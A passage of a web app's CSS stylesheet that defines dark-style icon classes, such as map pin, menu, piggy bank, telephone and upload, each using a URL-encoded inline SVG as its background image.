      background-image: url("data:image/svg+xml;charset=US-ASCII,%0A%3Csvg%20id%3D%22Layer_1%22%20data-name%3D%22Layer%201%22%20xmlns%3D%22http%3A//www.w3.org/2000/svg%22%20viewBox%3D%220%200%2040%2040%22%3E%3Cdefs%3E%3Cstyle%3E.cls-1%7Bfill%3A%23002d72%3B%7D.cls-2%7Bfill%3A%23fff%3B%7D%3C/style%3E%3C/defs%3E%3Ctitle%3Ebf_primary_circle_b_rgb_mappin%3C/title%3E%3Cpath%20class%3D%22cls-1%22%20d%3D%22M21%2C41A20%2C20%2C0%2C1%2C0%2C1%2C21%2C20%2C20%2C0%2C0%2C0%2C21%2C41%22%20transform%3D%22translate%28-1%20-1%29%22/%3E%3Cpath%20class%3D%22cls-2%22%20d%3D%22M29%2C17c0%2C4.73-8%2C14.9-8%2C14.9S13%2C21.73%2C13%2C17a7.81%2C7.81%2C0%2C0%2C1%2C8-8%2C7.81%2C7.81%2C0%2C0%2C1%2C8%2C8m2%2C0a10%2C10%2C0%2C0%2C0-20%2C0c0%2C5.52%2C10%2C18%2C10%2C18S31%2C22.52%2C31%2C17m-6%2C0a4%2C4%2C0%2C1%2C1-4-4%2C4%2C4%2C0%2C0%2C1%2C4%2C4m2%2C0a6%2C6%2C0%2C1%2C0-6%2C6%2C6%2C6%2C0%2C0%2C0%2C6-6%22%20transform%3D%22translate%28-1%20-1%29%22/%3E%3C/svg%3E");
      background-repeat: no-repeat;
      width: 20px;
      height: 24px;
      background-size: 20px 24px
    }

    .cbolui-icon-menu-dark[_ngcontent-yta-c101] {
      background-image: url("data:image/svg+xml;charset=US-ASCII,%3Csvg%20id%3D%22Layer_1%22%20data-name%3D%22Layer%201%22%20xmlns%3D%22http%3A//www.w3.org/2000/svg%22%20viewBox%3D%220%200%2040%2040%22%3E%3Cdefs%3E%3Cstyle%3E.cls-1%7Bfill%3A%23002d72%3B%7D.cls-2%7Bfill%3A%23fff%3B%7D%3C/style%3E%3C/defs%3E%3Ctitle%3Ebf_primary_circle_b_rgb_menu%3C/title%3E%3Cpath%20class%3D%22cls-1%22%20d%3D%22M21%2C41A20%2C20%2C0%2C1%2C0%2C1%2C21%2C20%2C20%2C0%2C0%2C0%2C21%2C41%22%20transform%3D%22translate%28-1%20-1%29%22/%3E%3Cpath%20class%3D%22cls-2%22%20d%3D%22M11%2C15H31v2H11Zm0%2C12H31V25H11Zm0-5H31V20H11Z%22%20transform%3D%22translate%28-1%20-1%29%22/%3E%3C/svg%3E");
      background-repeat: no-repeat;
      width: 20px;
      height: 24px;
      background-size: 20px 24px
    }

    .cbolui-icon-minus-dark[_ngcontent-yta-c101] {
      background-image: url("data:image/svg+xml;charset=US-ASCII,%3Csvg%20id%3D%22Layer_1%22%20data-name%3D%22Layer%201%22%20xmlns%3D%22http%3A//www.w3.org/2000/svg%22%20viewBox%3D%220%200%2040%2040%22%3E%3Cdefs%3E%3Cstyle%3E.cls-1%7Bfill%3A%23002d72%3B%7D.cls-2%7Bfill%3A%23fff%3B%7D%3C/style%3E%3C/defs%3E%3Ctitle%3Ebf_primary_circle_b_rgb_minus%3C/title%3E%3Cpath%20class%3D%22cls-1%22%20d%3D%22M21%2C41A20%2C20%2C0%2C1%2C0%2C1%2C21%2C20%2C20%2C0%2C0%2C0%2C21%2C41%22%20transform%3D%22translate%28-1%20-1%29%22/%3E%3Crect%20class%3D%22cls-2%22%20x%3D%2210%22%20y%3D%2219%22%20width%3D%2220%22%20height%3D%222%22/%3E%3C/svg%3E");
      background-repeat: no-repeat;
      width: 20px;
      height: 24px;
      background-size: 20px 24px
    }

    .cbolui-icon-mobile-dark[_ngcontent-yta-c101] {
      background-image: url("data:image/svg+xml;charset=US-ASCII,%3C%3Fxml%20version%3D%221.0%22%20encoding%3D%22utf-8%22%3F%3E%0A%3C!--%20Generator%3A%20Adobe%20Illustrator%2022.0.1%2C%20SVG%20Export%20Plug-In%20.%20SVG%20Version%3A%206.00%20Build%200%29%20%20--%3E%0A%3Csvg%20version%3D%221.1%22%20id%3D%22Layer%5f1%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%20xmlns%3Axlink%3D%22http%3A%2F%2Fwww.w3.org%2F1999%2Fxlink%22%20x%3D%220px%22%20y%3D%220px%22%0A%09%20viewBox%3D%220%200%2040%2040%22%20style%3D%22enable-background%3Anew%200%200%2040%2040%3B%22%20xml%3Aspace%3D%22preserve%22%3E%0A%3Cstyle%20type%3D%22text%2Fcss%22%3E%0A%09.st0%7Bfill%3A%23002A54%3B%7D%0A%3C%2Fstyle%3E%0A%3Cg%3E%0A%09%3Cpath%20class%3D%22st0%22%20d%3D%22M24.5%2C9h-9C14.7%2C9%2C14%2C9.7%2C14%2C10.5V12h12v-1.5C26%2C9.7%2C25.3%2C9%2C24.5%2C9z%22%2F%3E%0A%09%3Cpath%20class%3D%22st0%22%20d%3D%22M14%2C29.5c0%2C0.8%2C0.7%2C1.5%2C1.5%2C1.5h9c0.8%2C0%2C1.5-0.7%2C1.5-1.5V28H14V29.5z%22%2F%3E%0A%09%3Cpath%20class%3D%22st0%22%20d%3D%22M20%2C1C9.5%2C1%2C1%2C9.5%2C1%2C20s8.5%2C19%2C19%2C19s19-8.5%2C19-19S30.5%2C1%2C20%2C1z%20M27%2C12v1v14v1v1.5c0%2C1.4-1.1%2C2.5-2.5%2C2.5h-9%0A%09%09c-1.4%2C0-2.5-1.1-2.5-2.5V28v-1V13v-1v-1.5C13%2C9.1%2C14.1%2C8%2C15.5%2C8h9c1.4%2C0%2C2.5%2C1.1%2C2.5%2C2.5V12z%22%2F%3E%0A%09%3Cpath%20id%3D%22path-3%5f1%5f%22%20class%3D%22st0%22%20d%3D%22M14%2C27h12V13H14V27z%22%2F%3E%0A%3C%2Fg%3E%0A%3C%2Fsvg%3E%0A");
      background-repeat: no-repeat;
      width: 20px;
      height: 24px;
      background-size: 20px 24px
    }

    .cbolui-icon-pencil-dark[_ngcontent-yta-c101] {
      background-image: url("data:image/svg+xml;charset=US-ASCII,%3Csvg%20id%3D%22Layer_1%22%20data-name%3D%22Layer%201%22%20xmlns%3D%22http%3A//www.w3.org/2000/svg%22%20viewBox%3D%220%200%2040%2040%22%3E%3Cdefs%3E%3Cstyle%3E.cls-1%7Bfill%3A%23002d72%3B%7D.cls-2%7Bfill%3A%23fff%3B%7D%3C/style%3E%3C/defs%3E%3Ctitle%3Ebf_primary_circle_b_rgb_pencil%3C/title%3E%3Cpath%20class%3D%22cls-1%22%20d%3D%22M21%2C41A20%2C20%2C0%2C1%2C0%2C1%2C21%2C20%2C20%2C0%2C0%2C0%2C21%2C41%22%20transform%3D%22translate%28-1%20-1%29%22/%3E%3Cpath%20class%3D%22cls-2%22%20d%3D%22M27%2C25.89l2-1.06V29a4%2C4%2C0%2C0%2C1-4%2C4H13a4%2C4%2C0%2C0%2C1-4-4V13a4%2C4%2C0%2C0%2C1%2C4-4H25a4%2C4%2C0%2C0%2C1%2C3.86%2C3.31L27%2C13.3V13a2%2C2%2C0%2C0%2C0-2-2H13a2%2C2%2C0%2C0%2C0-2%2C2V29a2%2C2%2C0%2C0%2C0%2C2%2C2H25a2%2C2%2C0%2C0%2C0%2C2-2Zm11.14-8L20%2C27.51H14.1l-1-1.88%2C3.25-4.82%2C0-.06L34.55%2C11.1ZM19.91%2C21.14l1.72%2C3.24%2C9.25-4.92-1.72-3.24Zm-.4%2C4.37.36-.19-1.72-3.24-.36.19L15.6%2C25.51ZM35.44%2C17%2C33.72%2C13.8l-2.8%2C1.49%2C1.72%2C3.24Z%22%20transform%3D%22translate%28-1%20-1%29%22/%3E%3C/svg%3E");
      background-repeat: no-repeat;
      width: 20px;
      height: 24px;
      background-size: 20px 24px
    }

    .cbolui-icon-people-dark[_ngcontent-yta-c101] {
      background-image: url("data:image/svg+xml;charset=US-ASCII,%0A%3Csvg%20id%3D%22Layer_1%22%20data-name%3D%22Layer%201%22%20xmlns%3D%22http%3A//www.w3.org/2000/svg%22%20viewBox%3D%220%200%2040%2040%22%3E%3Cdefs%3E%3Cstyle%3E.cls-1%7Bfill%3A%23002d72%3B%7D.cls-2%7Bfill%3A%23fff%3B%7D%3C/style%3E%3C/defs%3E%3Ctitle%3Ebf_primary_circle_b_rgb_people%3C/title%3E%3Cpath%20class%3D%22cls-1%22%20d%3D%22M21%2C41A20%2C20%2C0%2C1%2C0%2C1%2C21%2C20%2C20%2C0%2C0%2C0%2C21%2C41%22%20transform%3D%22translate%28-1%20-1%29%22/%3E%3Cpath%20class%3D%22cls-2%22%20d%3D%22M28%2C19a5%2C5%2C0%2C1%2C0-5-5A5%2C5%2C0%2C0%2C0%2C28%2C19Zm0-8a3%2C3%2C0%2C1%2C1-3%2C3A3%2C3%2C0%2C0%2C1%2C28%2C11ZM14%2C19a5%2C5%2C0%2C1%2C0-5-5A5%2C5%2C0%2C0%2C0%2C14%2C19Zm0-8a3%2C3%2C0%2C1%2C1-3%2C3A3%2C3%2C0%2C0%2C1%2C14%2C11Zm.77%2C10.43A3.9%2C3.9%2C0%2C0%2C0%2C13%2C21a4%2C4%2C0%2C0%2C0-4%2C4H9v8H21V24.72l-6.19-3.29ZM19%2C31H11V25h0a2%2C2%2C0%2C0%2C1%2C2-2%2C3.51%2C3.51%2C0%2C0%2C1%2C1%2C.27l5%2C2.66Zm14-6h0v8H23V31h8V25a2%2C2%2C0%2C0%2C0-2-2%2C2%2C2%2C0%2C0%2C0-1%2C.3v0l-5%2C2.66V23.66l4.19-2.23A7.37%2C7.37%2C0%2C0%2C1%2C29%2C21%2C4%2C4%2C0%2C0%2C1%2C33%2C25Z%22%20transform%3D%22translate%28-1%20-1%29%22/%3E%3C/svg%3E");
      background-repeat: no-repeat;
      width: 20px;
      height: 24px;
      background-size: 20px 24px
    }

    .cbolui-icon-piggybank-dark[_ngcontent-yta-c101] {
      background-image: url("data:image/svg+xml;charset=US-ASCII,%0A%3Csvg%20id%3D%22Layer_1%22%20data-name%3D%22Layer%201%22%20xmlns%3D%22http%3A//www.w3.org/2000/svg%22%20viewBox%3D%220%200%2040%2040%22%3E%3Cdefs%3E%3Cstyle%3E.cls-1%7Bfill%3A%23002d72%3B%7D.cls-2%7Bfill%3A%23fff%3B%7D%3C/style%3E%3C/defs%3E%3Ctitle%3Ebf_primary_circle_b_rgb_piggybank%3C/title%3E%3Cpath%20class%3D%22cls-1%22%20d%3D%22M21%2C41A20%2C20%2C0%2C1%2C1%2C41%2C21%2C20%2C20%2C0%2C0%2C1%2C21%2C41%22%20transform%3D%22translate%28-1%20-1%29%22/%3E%3Cpath%20class%3D%22cls-2%22%20d%3D%22M25.74%2C18.37A5.55%2C5.55%2C0%2C0%2C0%2C22%2C17a5.62%2C5.62%2C0%2C0%2C0-3.62%2C1.25l-1.83-1a7.66%2C7.66%2C0%2C0%2C1%2C11%2C.12ZM32.36%2C17A7.5%2C7.5%2C0%2C0%2C1%2C33%2C20a8.38%2C8.38%2C0%2C0%2C1-4%2C6.87V31H15V26.87A9.22%2C9.22%2C0%2C0%2C1%2C11.7%2C23H9V17h2.72A8.41%2C8.41%2C0%2C0%2C1%2C13%2C15V9h2l4.36%2C2.28A12.69%2C12.69%2C0%2C0%2C1%2C22%2C11a11.68%2C11.68%2C0%2C0%2C1%2C9.36%2C4.28l1.4-.74.94%2C1.76ZM31%2C20c0-3.87-4-7-9-7a11.24%2C11.24%2C0%2C0%2C0-2.88.39L15%2C11.26v4.37A6.39%2C6.39%2C0%2C0%2C0%2C13.13%2C19H11v2h2.13A7.12%2C7.12%2C0%2C0%2C0%2C17%2C25.76V29h4V27h2v2h4V25.76C29.36%2C24.5%2C31%2C22.39%2C31%2C20Z%22%20transform%3D%22translate%28-1%20-1%29%22/%3E%3C/svg%3E");
      background-repeat: no-repeat;
      width: 20px;
      height: 24px;
      background-size: 20px 24px
    }

    .cbolui-icon-wear-dark[_ngcontent-yta-c101] {
      background-image: url("data:image/svg+xml;charset=US-ASCII,%3Csvg%20id%3D%22Layer_1%22%20data-name%3D%22Layer%201%22%20xmlns%3D%22http%3A//www.w3.org/2000/svg%22%20viewBox%3D%220%200%2040%2040%22%3E%3Cdefs%3E%3Cstyle%3E.cls-1%7Bfill%3A%23002d72%3B%7D.cls-2%7Bfill%3A%23fff%3B%7D%3C/style%3E%3C/defs%3E%3Ctitle%3Ebf_primary_circle_b_rgb_gear%3C/title%3E%3Cpath%20class%3D%22cls-1%22%20d%3D%22M21%2C41A20%2C20%2C0%2C1%2C0%2C1%2C21%2C20%2C20%2C0%2C0%2C0%2C21%2C41%22%20transform%3D%22translate%28-1%20-1%29%22/%3E%3Cpath%20class%3D%22cls-2%22%20d%3D%22M21%2C16a5%2C5%2C0%2C1%2C0%2C5%2C5A5%2C5%2C0%2C0%2C0%2C21%2C16Zm0%2C8a3%2C3%2C0%2C1%2C1%2C3-3A3%2C3%2C0%2C0%2C1%2C21%2C24Zm11-1.27a11.06%2C11.06%2C0%2C0%2C0%2C0-3.46l3.13-1.8-4-6.93L28%2C12.34a11.08%2C11.08%2C0%2C0%2C0-3-1.73V7H17v3.57a11%2C11%2C0%2C0%2C0-1.59.74%2C10.82%2C10.82%2C0%2C0%2C0-1.43%2C1l-3.1-1.79-4%2C6.93L10%2C19.27a11.28%2C11.28%2C0%2C0%2C0%2C0%2C3.46l-3.12%2C1.8h0l4%2C6.93L14%2C29.66a11.16%2C11.16%2C0%2C0%2C0%2C3%2C1.73V35h8V31.43a9.8%2C9.8%2C0%2C0%2C0%2C3-1.75l3.09%2C1.79%2C4-6.93Zm-1.6%2C6-2.57-1.48A8.72%2C8.72%2C0%2C0%2C1%2C23%2C30v3H19V30a9.23%2C9.23%2C0%2C0%2C1-4.84-2.77l-2.55%2C1.47-2-3.46%2C2.55-1.47a9.26%2C9.26%2C0%2C0%2C1%2C0-5.58L9.61%2C16.73l2-3.46%2C2.56%2C1.48A8.74%2C8.74%2C0%2C0%2C1%2C19%2C12V9h4v3a9.26%2C9.26%2C0%2C0%2C1%2C4.85%2C2.78l2.55-1.47%2C2%2C3.46L29.85%2C18.2a9.23%2C9.23%2C0%2C0%2C1%2C0%2C5.58l2.57%2C1.48Z%22%20transform%3D%22translate%28-1%20-1%29%22/%3E%3C/svg%3E");
      background-repeat: no-repeat;
      width: 20px;
      height: 24px;
      background-size: 20px 24px
    }

    .cbolui-icon-playbutton-dark[_ngcontent-yta-c101] {
      background-image: url("data:image/svg+xml;charset=US-ASCII,%0A%3Csvg%20id%3D%22Layer_1%22%20data-name%3D%22Layer%201%22%20xmlns%3D%22http%3A//www.w3.org/2000/svg%22%20viewBox%3D%220%200%2040%2040%22%3E%3Cdefs%3E%3Cstyle%3E.cls-1%7Bfill%3A%23002d72%3B%7D.cls-2%7Bfill%3A%23fff%3B%7D%3C/style%3E%3C/defs%3E%3Ctitle%3Ebf_primary_circle_b_rgb_play_button%3C/title%3E%3Cpath%20class%3D%22cls-1%22%20d%3D%22M21%2C41A20%2C20%2C0%2C1%2C0%2C1%2C21%2C20%2C20%2C0%2C0%2C0%2C21%2C41%22%20transform%3D%22translate%28-1%20-1%29%22/%3E%3Cpath%20class%3D%22cls-2%22%20d%3D%22M29%2C11H13a6%2C6%2C0%2C0%2C0-6%2C6v8a6%2C6%2C0%2C0%2C0%2C6%2C6H29a6%2C6%2C0%2C0%2C0%2C6-6V17A6%2C6%2C0%2C0%2C0%2C29%2C11Zm4%2C14.19A4%2C4%2C0%2C0%2C1%2C29.2%2C29H12.81A4%2C4%2C0%2C0%2C1%2C9%2C25.19V16.81A4%2C4%2C0%2C0%2C1%2C12.81%2C13H29.2A4%2C4%2C0%2C0%2C1%2C33%2C16.81ZM18%2C26.34a1%2C1%2C0%2C0%2C1-1-1V16.66a1%2C1%2C0%2C0%2C1%2C.48-.86%2C1%2C1%2C0%2C0%2C1%2C1%2C0l8.17%2C4.33a1%2C1%2C0%2C0%2C1%2C0%2C1.77l-8.17%2C4.34A1%2C1%2C0%2C0%2C1%2C18%2C26.34Zm1-8v5.35L24%2C21Z%22%20transform%3D%22translate%28-1%20-1%29%22/%3E%3C/svg%3E");
      background-repeat: no-repeat;
      width: 20px;
      height: 24px;
      background-size: 20px 24px
    }

    .cbolui-icon-plus-dark[_ngcontent-yta-c101] {
      background-image: url("data:image/svg+xml;charset=US-ASCII,%3Csvg%20id%3D%22Layer_1%22%20data-name%3D%22Layer%201%22%20xmlns%3D%22http%3A//www.w3.org/2000/svg%22%20viewBox%3D%220%200%2040%2040%22%3E%3Cdefs%3E%3Cstyle%3E.cls-1%7Bfill%3A%23002d72%3B%7D.cls-2%7Bfill%3A%23fff%3B%7D%3C/style%3E%3C/defs%3E%3Ctitle%3Ebf_primary_circle_b_rgb_plus%3C/title%3E%3Cpath%20class%3D%22cls-1%22%20d%3D%22M21%2C41A20%2C20%2C0%2C1%2C0%2C1%2C21%2C20%2C20%2C0%2C0%2C0%2C21%2C41%22%20transform%3D%22translate%28-1%20-1%29%22/%3E%3Cpolygon%20class%3D%22cls-2%22%20points%3D%2230%2019%2021%2019%2021%2010%2019%2010%2019%2019%2010%2019%2010%2021%2019%2021%2019%2030%2021%2030%2021%2021%2030%2021%2030%2019%22/%3E%3C/svg%3E");
      background-repeat: no-repeat;
      width: 20px;
      height: 24px;
      background-size: 20px 24px
    }

    .cbolui-icon-print-dark[_ngcontent-yta-c101] {
      background-image: url("data:image/svg+xml;charset=US-ASCII,%0A%3Csvg%20id%3D%22Layer_1%22%20data-name%3D%22Layer%201%22%20xmlns%3D%22http%3A//www.w3.org/2000/svg%22%20viewBox%3D%220%200%2040%2040%22%3E%3Cdefs%3E%3Cstyle%3E.cls-1%7Bfill%3A%23002d72%3B%7D.cls-2%7Bfill%3A%23fff%3B%7D%3C/style%3E%3C/defs%3E%3Ctitle%3Ebf_primary_circle_b_rgb_print%3C/title%3E%3Cpath%20class%3D%22cls-1%22%20d%3D%22M21%2C41A20%2C20%2C0%2C1%2C0%2C1%2C21%2C20%2C20%2C0%2C0%2C0%2C21%2C41%22%20transform%3D%22translate%28-1%20-1%29%22/%3E%3Cpath%20class%3D%22cls-2%22%20d%3D%22M29%2C19h2v2H29Zm6%2C0v8H29v4H13V27H7V19a4%2C4%2C0%2C0%2C1%2C4-4h2V9H29v6h2A4%2C4%2C0%2C0%2C1%2C35%2C19ZM15%2C15H27V11H15Zm0%2C14H27V23H15Zm18-8V19a2%2C2%2C0%2C0%2C0-2-2H11a2%2C2%2C0%2C0%2C0-2%2C2v6h4V21H29v4h4Z%22%20transform%3D%22translate%28-1%20-1%29%22/%3E%3C/svg%3E");
      background-repeat: no-repeat;
      width: 20px;
      height: 24px;
      background-size: 20px 24px
    }

    .cbolui-icon-profile-dark[_ngcontent-yta-c101] {
      background-image: url("data:image/svg+xml;charset=US-ASCII,%0A%3Csvg%20id%3D%22Layer_1%22%20data-name%3D%22Layer%201%22%20xmlns%3D%22http%3A//www.w3.org/2000/svg%22%20viewBox%3D%220%200%2040%2040%22%3E%3Cdefs%3E%3Cstyle%3E.cls-1%7Bfill%3A%23002d72%3B%7D.cls-2%7Bfill%3A%23fff%3B%7D%3C/style%3E%3C/defs%3E%3Ctitle%3Ebf_primary_circle_b_rgb_profile%3C/title%3E%3Cpath%20class%3D%22cls-1%22%20d%3D%22M21%2C41A20%2C20%2C0%2C1%2C0%2C1%2C21%2C20%2C20%2C0%2C0%2C0%2C21%2C41%22%20transform%3D%22translate%28-1%20-1%29%22/%3E%3Cpath%20class%3D%22cls-2%22%20d%3D%22M25%2C17a4%2C4%2C0%2C1%2C1-4-4%2C4%2C4%2C0%2C0%2C1%2C4%2C4m2%2C0a6%2C6%2C0%2C1%2C0-6%2C6%2C6%2C6%2C0%2C0%2C0%2C6-6m-6%2C7.39L9.36%2C30.58l.94%2C1.77L21%2C26.66l10.7%2C5.69.94-1.77Z%22%20transform%3D%22translate%28-1%20-1%29%22/%3E%3C/svg%3E");
      background-repeat: no-repeat;
      width: 20px;
      height: 24px;
      background-size: 20px 24px
    }

    .cbolui-icon-search-dark[_ngcontent-yta-c101] {
      background-image: url("data:image/svg+xml;charset=US-ASCII,%0A%3Csvg%20id%3D%22Layer_1%22%20data-name%3D%22Layer%201%22%20xmlns%3D%22http%3A//www.w3.org/2000/svg%22%20viewBox%3D%220%200%2040%2040%22%3E%3Cdefs%3E%3Cstyle%3E.cls-1%7Bfill%3A%23002d72%3B%7D.cls-2%7Bfill%3A%23fff%3B%7D%3C/style%3E%3C/defs%3E%3Ctitle%3Ebf_primary_circle_b_rgb_search%3C/title%3E%3Cpath%20class%3D%22cls-1%22%20d%3D%22M21%2C41A20%2C20%2C0%2C1%2C0%2C1%2C21%2C20%2C20%2C0%2C0%2C0%2C21%2C41%22%20transform%3D%22translate%28-1%20-1%29%22/%3E%3Cpath%20class%3D%22cls-2%22%20d%3D%22M23%2C9a8%2C8%2C0%2C0%2C0-4.6%2C14.53L13%2C33.7l1.77.94%2C5.41-10.18A8%2C8%2C0%2C1%2C0%2C23%2C9Zm0%2C14a6%2C6%2C0%2C1%2C1%2C6-6A6%2C6%2C0%2C0%2C1%2C23%2C23Z%22%20transform%3D%22translate%28-1%20-1%29%22/%3E%3C/svg%3E");
      background-repeat: no-repeat;
      width: 20px;
      height: 24px;
      background-size: 20px 24px
    }

    .cbolui-icon-shopping-dark[_ngcontent-yta-c101] {
      background-image: url("data:image/svg+xml;charset=US-ASCII,%0A%3Csvg%20id%3D%22Layer_1%22%20data-name%3D%22Layer%201%22%20xmlns%3D%22http%3A//www.w3.org/2000/svg%22%20viewBox%3D%220%200%2040%2040%22%3E%3Cdefs%3E%3Cstyle%3E.cls-1%7Bfill%3A%23002d72%3B%7D.cls-2%7Bfill%3A%23fff%3B%7D%3C/style%3E%3C/defs%3E%3Ctitle%3Ebf_primary_circle_b_rgb_shopping_cart%3C/title%3E%3Cpath%20class%3D%22cls-1%22%20d%3D%22M41%2C21A20%2C20%2C0%2C1%2C1%2C21%2C1%2C20%2C20%2C0%2C0%2C1%2C41%2C21%22%20transform%3D%22translate%28-1%20-1%29%22/%3E%3Cpath%20class%3D%22cls-2%22%20d%3D%22M29%2C33a2%2C2%2C0%2C1%2C1-2-2A2%2C2%2C0%2C0%2C1%2C29%2C33ZM17%2C31a2%2C2%2C0%2C1%2C0%2C2%2C2A2%2C2%2C0%2C0%2C0%2C17%2C31ZM31%2C15v6h0l-7.58%2C4v0H13a2%2C2%2C0%2C0%2C0%2C2%2C2H29v2H15a4%2C4%2C0%2C0%2C1-4-4V15H7V13h6v2Zm-2%2C2H13v6H23l6-3.2Z%22%20transform%3D%22translate%28-1%20-1%29%22/%3E%3C/svg%3E");
      background-repeat: no-repeat;
      width: 20px;
      height: 24px;
      background-size: 20px 24px
    }

    .cbolui-icon-talk-dark[_ngcontent-yta-c101] {
      background-image: url("data:image/svg+xml;charset=US-ASCII,%3Csvg%20id%3D%22Layer_1%22%20data-name%3D%22Layer%201%22%20xmlns%3D%22http%3A//www.w3.org/2000/svg%22%20viewBox%3D%220%200%2040%2040%22%3E%3Cdefs%3E%3Cstyle%3E.cls-1%7Bfill%3A%23002d72%3B%7D.cls-2%7Bfill%3A%23fff%3B%7D%3C/style%3E%3C/defs%3E%3Ctitle%3Ebf_primary_circle_b_rgb_talk%3C/title%3E%3Cpath%20class%3D%22cls-1%22%20d%3D%22M21%2C41A20%2C20%2C0%2C1%2C0%2C1%2C21%2C20%2C20%2C0%2C0%2C0%2C21%2C41%22%20transform%3D%22translate%28-1%20-1%29%22/%3E%3Cpath%20class%3D%22cls-2%22%20d%3D%22M31%2C19c0%2C3-2%2C5.51-5%2C6.89l-9%2C4.78V26.27c-3.52-1.24-6-4-6-7.27%2C0-4.42%2C4.48-8%2C10-8s10%2C3.58%2C10%2C8m2%2C0c0-5.52-5.37-10-12-10S9%2C13.48%2C9%2C19c0%2C3.69%2C2.42%2C6.88%2C6%2C8.6V34l12.94-6.88h0A9.54%2C9.54%2C0%2C0%2C0%2C33%2C19%22%20transform%3D%22translate%28-1%20-1%29%22/%3E%3C/svg%3E");
      background-repeat: no-repeat;
      width: 20px;
      height: 24px;
      background-size: 20px 24px
    }

    .cbolui-icon-telephone-dark[_ngcontent-yta-c101] {
      background-image: url("data:image/svg+xml;charset=US-ASCII,%0A%3Csvg%20id%3D%22Layer_1%22%20data-name%3D%22Layer%201%22%20xmlns%3D%22http%3A//www.w3.org/2000/svg%22%20viewBox%3D%220%200%2040%2040%22%3E%3Cdefs%3E%3Cstyle%3E.cls-1%7Bfill%3A%23002d72%3B%7D.cls-2%7Bfill%3A%23fff%3B%7D%3C/style%3E%3C/defs%3E%3Ctitle%3Ebf_primary_circle_b_rgb_telephone%3C/title%3E%3Cpath%20class%3D%22cls-1%22%20d%3D%22M21%2C41A20%2C20%2C0%2C1%2C0%2C1%2C21%2C20%2C20%2C0%2C0%2C0%2C21%2C41%22%20transform%3D%22translate%28-1%20-1%29%22/%3E%3Cpath%20class%3D%22cls-2%22%20d%3D%22M31.11%2C31.49l-3.75-7.06-4.54%2C0-3.64-6.84%2C2.49-3.69L18%2C6.76h0L14.44%2C8.64h0A6%2C6%2C0%2C0%2C0%2C12%2C16.76h0l7.51%2C14.13h0a6%2C6%2C0%2C0%2C0%2C8.11%2C2.48h0l3.53-1.88Zm-4.47.11h0a4%2C4%2C0%2C0%2C1-5.41-1.65L13.72%2C15.82a4%2C4%2C0%2C0%2C1%2C1.65-5.41h0l1.77-.94%2C2.24%2C4.21-2.53%2C3.75h0l4.79%2C9h4.5l2.27%2C4.26-1.76.94Z%22%20transform%3D%22translate%28-1%20-1%29%22/%3E%3C/svg%3E");
      background-repeat: no-repeat;
      width: 20px;
      height: 24px;
      background-size: 20px 24px
    }

    .cbolui-icon-tiles-dark[_ngcontent-yta-c101] {
      background-image: url("data:image/svg+xml;charset=US-ASCII,%0A%3Csvg%20id%3D%22Layer_1%22%20data-name%3D%22Layer%201%22%20xmlns%3D%22http%3A//www.w3.org/2000/svg%22%20viewBox%3D%220%200%2040%2040%22%3E%3Cdefs%3E%3Cstyle%3E.cls-1%7Bfill%3A%23002d72%3B%7D.cls-2%7Bfill%3A%23fff%3B%7D%3C/style%3E%3C/defs%3E%3Ctitle%3Ebf_primary_circle_b_rgb_tiles%3C/title%3E%3Cpath%20class%3D%22cls-1%22%20d%3D%22M21%2C41A20%2C20%2C0%2C1%2C0%2C1%2C21%2C20%2C20%2C0%2C0%2C0%2C21%2C41%22%20transform%3D%22translate%28-1%20-1%29%22/%3E%3Cpath%20class%3D%22cls-2%22%20d%3D%22M13%2C9a4%2C4%2C0%2C0%2C0-4%2C3.83H9V19H19V9Zm4%2C8H11V13a2%2C2%2C0%2C0%2C1%2C2-2h4Zm16-4a4%2C4%2C0%2C0%2C0-4-4H23V19H33V13Zm-2%2C4H25V11h4a2%2C2%2C0%2C0%2C1%2C2%2C2ZM9%2C23v6a4%2C4%2C0%2C0%2C0%2C4%2C4h6V23Zm8%2C8H13a2%2C2%2C0%2C0%2C1-2-2V25h6Zm6-8V33h6a4%2C4%2C0%2C0%2C0%2C4-4V23Zm6%2C8H25V25h6v4A2%2C2%2C0%2C0%2C1%2C29%2C31Z%22%20transform%3D%22translate%28-1%20-1%29%22/%3E%3C/svg%3E");
      background-repeat: no-repeat;
      width: 20px;
      height: 24px;
      background-size: 20px 24px
    }

    .cbolui-icon-upload-dark[_ngcontent-yta-c101] {
      background-image: url("data:image/svg+xml;charset=US-ASCII,%0A%3Csvg%20id%3D%22Layer_1%22%20data-name%3D%22Layer%201%22%20xmlns%3D%22http%3A//www.w3.org/2000/svg%22%20viewBox%3D%220%200%2040%2040%22%3E%3Cdefs%3E%3Cstyle%3E.cls-1%7Bfill%3A%23002d72%3B%7D.cls-2%7Bfill%3A%23fff%3B%7D%3C/style%3E%3C/defs%3E%3Ctitle%3Ebf_primary_circle_b_rgb_upload%3C/title%3E%3Cpath%20class%3D%22cls-1%22%20d%3D%22M21%2C1A20%2C20%2C0%2C1%2C0%2C41%2C21%2C20%2C20%2C0%2C0%2C0%2C21%2C1%22%20transform%3D%22translate%28-1%20-1%29%22/%3E%3Cpath%20class%3D%22cls-2%22%20d%3D%22M9%2C19V17a6%2C6%2C0%2C0%2C1%2C6-6H27a6%2C6%2C0%2C0%2C1%2C6%2C6v2H31V17a4%2C4%2C0%2C0%2C0-4-4H15a4%2C4%2C0%2C0%2C0-4%2C4v2Zm11%2C6v8h2V25h3.62L21%2C17l-4.62%2C8Z%22%20transform%3D%22translate%28-1%20-1%29%22/%3E%3C/svg%3E");
      background-repeat: no-repeat;
      width: 20px;
      height: 24px;
      background-size: 20px 24px
    }

    .cbolui-icon-unlock-dark[_ngcontent-yta-c101] {
      background-image: 